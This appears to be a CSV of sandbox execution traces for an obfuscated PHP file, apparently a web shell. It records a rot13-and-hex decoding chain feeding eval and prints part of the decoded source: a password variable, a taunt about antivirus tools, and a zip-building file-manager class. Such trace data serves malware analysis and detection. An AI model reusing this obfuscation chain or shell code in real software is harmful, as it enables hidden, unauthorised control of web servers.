uuid,file_md5,index,source,target,argc,argv,return,dynamic
4aa7ef69b0f6a800147e22fccd29a31e,72e8848b6dd48b446cc362b26882d169,0,__main__,zend_compile_file,2.0,"{""value"": []}","{""value"": ""2809413C413C413C260000423C3E""}",[]
4aa7ef69b0f6a800147e22fccd29a31e,72e8848b6dd48b446cc362b26882d169,1,__main__,error_reporting,1.0,"{""value"": [[0, ""new_error_level"", 5]]}","{""value"": ""void""}",[0]
4aa7ef69b0f6a800147e22fccd29a31e,72e8848b6dd48b446cc362b26882d169,2,__main__,header,1.0,"{""value"": [[0, ""header"", ""content-Type: text/html; charset=utf-8""]]}","{""value"": ""void""}",[0]
4aa7ef69b0f6a800147e22fccd29a31e,72e8848b6dd48b446cc362b26882d169,3,__main__,set_time_limit,1.0,"{""value"": [[0, ""seconds"", 0]]}","{""value"": ""void""}",[0]
4aa7ef69b0f6a800147e22fccd29a31e,72e8848b6dd48b446cc362b26882d169,4,__main__,s,1.0,"{""value"": [[0, ""str"", ""2470617373776s7264203q2024733o0q0n244q794r616q652020203q2022r4oooor4oq95r998o2r5orn1r8oqnsr4ooo6r59pn8r68891r79popr9878pr983oqr698""]]}","{""value"": null}",[0]
4aa7ef69b0f6a800147e22fccd29a31e,72e8848b6dd48b446cc362b26882d169,5,s,str_rot13,1.0,"{""value"": [[0, ""str"", ""2470617373776s7264203q2024733o0q0n244q794r616q652020203q2022r4oooor4oq95r998o2r5orn1r8oqnsr4ooo6r59pn8r68891r79popr9878pr983oqr698""]]}","{""value"": ""2470617373776f7264203d2024733b0d0a244d794e616d652020203d2022e4bbbbe4bd95e998b2e5bea1e8bdafe4bbb6e59ca8e68891e79cbce9878ce983bde698""}",[0]
4aa7ef69b0f6a800147e22fccd29a31e,72e8848b6dd48b446cc362b26882d169,6,s,m,1.0,"{""value"": [[0, ""str"", ""2470617373776f7264203d2024733b0d0a244d794e616d652020203d2022e4bbbbe4bd95e998b2e5bea1e8bdafe4bbb6e59ca8e68891e79cbce9878ce983bde698""]]}","{""value"": null}",[0]
4aa7ef69b0f6a800147e22fccd29a31e,72e8848b6dd48b446cc362b26882d169,7,m,pack,2.0,"{""value"": [[0, ""format"", ""H*""], [1, ""args"", ""2470617373776f7264203d2024733b0d0a244d794e616d652020203d2022e4bbbbe4bd95e998b2e5bea1e8bdafe4bbb6e59ca8e68891e79cbce9878ce983bde698""]]}","{""value"": ""$password = $s;\r\n$MyName   = \""\\xe4\\xbb\\xbb\\xe4\\xbd\\x95\\xe9\\x98\\xb2\\xe5\\xbe\\xa1\\xe8\\xbd\\xaf\\xe4\\xbb\\xb6\\xe5\\x9c\\xa8\\xe6\\x88\\x91\\xe7\\x9c\\xbc\\xe9\\x87\\x8c\\xe9\\x83\\xbd\\xe6\\x98\\xaf\\xe5\\x9e\\x83\\xe5\\x9c\\xbe -- \\xe7\\x81\\xab\\xe5\\xb1\\xb1\"";\r\nfunction Root_GP($array)\r\n{\r\n\twhile(list($ke""}","[0, 0]"
4aa7ef69b0f6a800147e22fccd29a31e,72e8848b6dd48b446cc362b26882d169,8,m,eval,1.0,"{""value"": [[0, ""phpcode"", ""$password = $s;\r\n$MyName   = \""\\xe4\\xbb\\xbb\\xe4\\xbd\\x95\\xe9\\x98\\xb2\\xe5\\xbe\\xa1\\xe8\\xbd\\xaf\\xe4\\xbb\\xb6\\xe5\\x9c\\xa8\\xe6\\x88\\x91\\xe7\\x9c\\xbc\\xe9\\x87\\x8c\\xe9\\x83\\xbd\\xe6\\x98\\xaf\\xe5\\x9e\\x83\\xe5\\x9c\\xbe -- \\xe7\\x81\\xab\\xe5\\xb1\\xb1\"";\r\nfunction Root_GP($array)\r\n{\r\n\twhile(list($ke""]]}","{""value"": null}",[0]
4aa7ef69b0f6a800147e22fccd29a31e,72e8848b6dd48b446cc362b26882d169,9,eval,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""$password = $s;\r\n$MyName   = \""\\xe4\\xbb\\xbb\\xe4\\xbd\\x95\\xe9\\x98\\xb2\\xe5\\xbe\\xa1\\xe8\\xbd\\xaf\\xe4\\xbb\\xb6\\xe5\\x9c\\xa8\\xe6\\x88\\x91\\xe7\\x9c\\xbc\\xe9\\x87\\x8c\\xe9\\x83\\xbd\\xe6\\x98\\xaf\\xe5\\x9e\\x83\\xe5\\x9c\\xbe -- \\xe7\\x81\\xab\\xe5\\xb1\\xb1\"";\r\nfunction Root_GP($array)\r\n{\r\n\twhile(list($key,$var) = each($array))\r\n\t{\r\n\t\tif((strtoupper($key) != $key || ''.intval($key) == \""$key\"") && $key != 'argc' && $key != 'argv')\r\n\t\t{\r\n\t\t\tif(is_string($var)) $array[$key] = stripslashes($var);\r\n\t\t\tif(is_array($var)) $array[$key] = Root_GP($var);  \r\n\t\t}\r\n\t}\r\n\treturn $array;\r\n}\r\n\r\nfunction Root_CSS()\r\n{\r\nprint<<<END\r\n<link rel=\""stylesheet\"" type=\""text/css\"" href=\""https://cdn.jsdelivr.net/npm/layui-src@2.3.0/dist/css/layui.css\"" />\r\n<script type=\""text/javascript\"" src=\""https://cdn.jsdelivr.net/npm/layui-src@2.3.0/dist/layui.js\""></script>\r\n<style>body{min-width:895px;padding:0 10px}#msgbox{font-size:16px;text-align:center;background-color:#efefef;height:40px;line-height:40px;border-bottom:1px solid #eee;margin-bottom:10px}.checked0 .layui-form-checkbox{margin-left:0}.checkbox-color .layui-form-checked span{background-color:#e17575}.checkbox-color .layui-form-checked i{color:#e17575}.layui-form-radio>i:hover,.layui-form-radioed>i{color:#e17575}</style>\r\n\\n\r\nEND;\r\nreturn false;\r\n}\r\n\r\n//\\xe6\\x96\\x87\\xe4\\xbb\\xb6\\xe7\\xae\\xa1\\xe7\\x90\\x86\r\nclass PHPzip{\r\n\r\n\tvar $file_count = 0 ;\r\n\tvar $datastr_len   = 0;\r\n\tvar $dirstr_len = 0;\r\n\tvar $filedata = ''; //\\xe8\\xaf\\xa5\\xe5\\x8f\\x98\\xe9\\x87\\x8f\\xe5\\x8f\\xaa\\xe8\\xa2\\xab\\xe7\\xb1\\xbb\\xe5\\xa4\\x96\\xe9\\x83\\xa8\\xe7\\xa8\\x8b\\xe5\\xba\\x8f\\xe8\\xae\\xbf\\xe9\\x97\\xae\r\n\tvar $gzfilename;\r\n\tvar $fp;\r\n\tvar $dirstr='';\r\n\t/*\r\n\t\\xe8\\xbf\\x94\\xe5\\x9b\\x9e\\xe6\\x96\\x87\\xe4\\xbb\\xb6\\xe7\\x9a\\x84\\xe4\\xbf\\xae\\xe6\\x94\\xb9\\xe6\\x97\\xb6\\xe9\\x97\\xb4\\xe6\\xa0\\xbc\\xe5\\xbc\\x8f.\r\n\t\\xe5\\x8f\\xaa\\xe4\\xb8\\xba\\xe6\\x9c\\xac\\xe7\\xb1\\xbb\\xe5\\x86\\x85\\xe9\\x83\\xa8\\xe5\\x87\\xbd\\xe6\\x95\\xb0\\xe8\\xb0\\x83\\xe7\\x94\\xa8.\r\n\t*/\r\n    function unix2DosTime($unixtime = 0) {\r\n        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);\r\n\r\n        if ($timearray['year'] < 1980) {\r\n        \t$timearray['year']    = 1980;\r\n        \t$timearray['mon']     = 1;\r\n        \t$timearray['mday']    = 1;\r\n        \t$timearray['hours']   = 0;\r\n        \t$timearray['minutes'] = 0;\r\n        \t$timearray['seconds'] = 0;\r\n        }\r\n\r\n        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |\r\n               ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);\r\n    }\r\n\r\n\tfunction startfile($path = 'phpinfo.zip'){\r\n\t\t$this->gzfilename=$path;\r\n\t\t$mypathdir=array();\r\n\t\tdo{\r\n\t\t\t$mypathdir[] = $path = dirname($path);\r\n\t\t}while($path != '.');\r\n\t\t@end($mypathdir);\r\n\t\tdo{\r\n\t\t\t$path = @current($mypathdir);\r\n\t\t\t@mkdir($path);\r\n\t\t}while(@prev($mypathdir));\r\n\r\n\t\tif($this->fp=@fopen($this->gzfilename,\""w\"")){\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\treturn false;\r\n\t}\r\n\r\n    function addfile($data, $name){\r\n        $name     = str_replace('\\\\', '/', $name);\r\n\t\t\r\n\t\tif(strrchr($name,'/')=='/') return $this->adddir($name);\r\n\t\t\r\n        $dtime    = dechex($this->unix2DosTime());\r\n        $hexdtime = '\\x' . $dtime[6] . $dtime[7]\r\n                  . '\\x' . $dtime[4] . $dtime[5]\r\n                  . '\\x' . $dtime[2] . $dtime[3]\r\n                  . '\\x' . $dtime[0] . $dtime[1];\r\n        eval('$hexdtime = \""' . $hexdtime . '\"";');\r\n\r\n        $unc_len = strlen($data);\r\n        $crc     = crc32($data);\r\n        $zdata   = gzcompress($data);\r\n        $c_len   = strlen($zdata);\r\n        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);\r\n\t\t\r\n        $datastr  = \""\\x50\\x4b\\x03\\x04\"";\r\n        $datastr .= \""\\x14\\x00\""; \r\n        $datastr .= \""\\x00\\x00\"";\r\n        $datastr .= \""\\x08\\x00\""; \r\n        $datastr .= $hexdtime; \r\n        $datastr .= pack('V', $crc);\r\n        $datastr .= pack('V', $c_len);\r\n        $datastr .= pack('V', $unc_len);\r\n        $datastr .= pack('v', strlen($name));\r\n        $datastr .= pack('v', 0); \r\n        $datastr .= $name;\r\n        $datastr .= $zdata;\r\n        $datastr .= pack('V', $crc); \r\n        $datastr .= pack('V', $c_len);\r\n        $datastr .= pack('V', $unc_len);\r\n\r\n\r\n\t\tfwrite($this->fp,$datastr);\r\n\t\t$my_datastr_len = strlen($datastr);\r\n\t\tunset($datastr);\r\n\t\t\r\n        $dirstr  = \""\\x50\\x4b\\x01\\x02\"";\r\n        $dirstr .= \""\\x00\\x00\""; \r\n        $dirstr .= \""\\x14\\x00\"";\r\n        $dirstr .= \""\\x00\\x00\"";\r\n        $dirstr .= \""\\x08\\x00\"";\r\n        $dirstr .= $hexdtime;\r\n        $dirstr .= pack('V', $crc); \r\n        $dirstr .= pack('V', $c_len); \r\n        $dirstr .= pack('V', $unc_len);       \t// uncompressed file""]]}","{""value"": ""26260000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000413C0D2B413C2B8D2A8D2A00000000000000000000000000000000003C2B50423C532650423C53262A5051112B41413C4F2A5051423C122B3C2659732B3C030126415051423C6A423C5051423C423C112B42413C132F42413C13342F42413C13342F5051112E50511134342B4F2A41423C41423C4F2A262A423C3C4F2A59732B505126122E12342B3C2A2A2659732B50519D2A413C6A3C9D26302B423C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B5051425051423C322A302B423C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A302B3C322A2A423C322A2A3E""}",[0]
